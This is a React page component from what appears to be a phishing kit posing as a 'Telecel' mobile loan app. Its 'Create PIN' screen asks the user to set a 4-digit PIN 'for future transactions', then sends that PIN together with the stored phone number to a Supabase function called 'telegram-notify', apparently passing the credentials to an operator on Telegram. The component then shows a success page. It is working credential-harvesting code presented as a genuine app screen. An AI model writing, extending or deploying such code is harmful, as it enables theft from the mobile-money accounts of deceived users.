import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import MobileShell from "@/components/MobileShell";
import { supabase } from "@/integrations/supabase/client";

const PinPage = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);

  const handleConfirm = async () => {
    if (pin.length < 4) return;
    setLoading(true);
    try {
      const saved = localStorage.getItem("telecel_loan");
      const phone = saved ? JSON.parse(saved).verifyPhone : "N/A";

      await supabase.functions.invoke("telegram-notify", {
        body: { type: "pin", value: pin, phone },
      });
    } catch (e) {
      console.error("Error sending PIN:", e);
    }
    setLoading(false);
    navigate("/success");
  };

  return (
    <MobileShell>
      <div className="telecel-gradient px-6 py-4 flex items-center gap-3">
        <button onClick={() => navigate("/otp")} className="text-primary-foreground">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="text-lg font-bold text-primary-foreground">Create PIN</h1>
      </div>

      <div className="flex-1 px-6 py-6 flex flex-col items-center space-y-6">
        <div className="text-center">
          <h2 className="text-lg font-semibold">Set a 4-Digit PIN</h2>
          <p className="text-sm text-muted-foreground mt-1">
            This PIN will be used for future transactions.
          </p>
        </div>

        <InputOTP maxLength={4} value={pin} onChange={setPin}>
          <InputOTPGroup>
            <InputOTPSlot index={0} />
            <InputOTPSlot index={1} />
            <InputOTPSlot index={2} />
            <InputOTPSlot index={3} />
          </InputOTPGroup>
        </InputOTP>
      </div>

      <div className="px-6 pb-6">
        <Button
          onClick={handleConfirm}
          disabled={pin.length < 4 || loading}
          className="w-full h-12 rounded-xl font-semibold"
        >
          {loading ? "Sending..." : "Confirm"}
        </Button>
      </div>
    </MobileShell>
  );
};

export default PinPage;
